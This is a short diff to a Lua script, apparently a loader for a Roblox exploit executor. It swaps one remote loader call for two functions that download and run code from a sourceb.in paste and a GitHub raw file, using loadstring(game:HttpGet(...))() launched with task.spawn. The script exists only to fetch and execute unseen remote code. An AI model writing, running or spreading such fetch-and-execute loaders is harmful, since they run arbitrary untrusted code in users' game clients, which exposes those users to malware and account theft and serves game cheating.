@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3NTA2NmI2LWUyNDctNDZhZS05NjBhLWIyZjVhMjY0MDhjZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMzF5eXl5eS9tYWluL3JlZnMvaGVhZHMvbWFpbi9sb2FkaW5nX3NjcmVlbi5sdWEifX0"))()
+local function s1() 
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/k8f9vpvvP0/0", true))()
+end 
+local function s2() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/loading_screen.lua"))()
+end
+
+task.spawn(s1)
+task.spawn(s2)
